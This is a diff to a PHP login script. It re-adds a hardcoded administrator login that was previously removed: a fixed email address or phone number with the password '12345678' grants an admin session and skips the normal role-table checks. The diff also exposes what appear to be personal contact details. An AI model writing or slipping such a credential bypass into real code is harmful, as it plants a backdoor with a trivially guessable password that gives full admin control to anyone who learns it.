@@ -36,7 +36,20 @@ if (empty($login_input) || empty($password)) {
     exit();
 }
 
-// Hardcoded admin checks removed; handled by roleTableMap below.
+// Hardcoded admin login
+if (($login_input === 'searchar04@gmail.com' || $login_input === '01743094595') && $password === '12345678') {
+    $_SESSION['user_id'] = 1;
+    $_SESSION['role'] = 'admin';
+    
+    if (!isset($_SESSION['active_roles']) || !is_array($_SESSION['active_roles'])) {
+        $_SESSION['active_roles'] = [];
+    }
+    $_SESSION['active_roles']['admin'] = 1;
+    $_SESSION['admin_role'] = 'admin';
+    
+    header("Location: ../Html/Admin.html?login=success");
+    exit();
+}
 
 $roleTableMap = [
     'admin'       => ['table' => 'admins', 'id_col' => 'admin_id', 'home' => '../Html/Admin.html'],
